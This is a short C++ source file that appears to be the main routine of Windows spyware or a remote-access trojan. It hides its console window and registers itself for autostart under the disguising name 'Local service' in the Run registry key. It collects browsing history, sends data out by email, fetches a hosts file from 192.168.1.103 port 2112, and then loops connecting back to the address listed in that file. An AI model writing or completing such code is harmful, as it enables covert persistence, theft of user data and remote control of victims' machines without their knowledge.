//do not show the cmd windows

//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#include "util.h"
#include<typeinfo>
#include<stdio.h>
#include<stdlib.h>
#include<string>
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )



int main()
{
	//FreeConsole();
	//copy();
	HKEY hkey;
	LPCTSTR lpRun = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	RegOpenKeyEx(HKEY_CURRENT_USER, lpRun, 0, KEY_WRITE, &hkey);
	TCHAR filename[MAX_PATH + 1];
	DWORD len = GetModuleFileName(NULL, filename, MAX_PATH);
	filename[len] = 0;
	RegSetValueEx(hkey, L"Local service", 0, REG_SZ,(const BYTE *)filename , (len+1)*sizeof(TCHAR));
	RegCloseKey(hkey);

	//ScreenCapture("asd.jpg");
	getHistory();
	list<string> l;
	sendemail(l);
	for(int i=0;i<10;++i)
	{
		if(get_host_file(L"192.168.1.103", 2112))
			break;
		else if (i == 9)
		{
			exit(0);
		}
	}
	
	ifstream infile("hosts.txt");
	string ip;
	string port;
	if(infile)
	{
		getline(infile, ip);
		getline(infile, port);
		infile.close();
		while (true)
		{
			tcpconnect(ip.c_str(), port.c_str());
		}
	}
	return 0;
}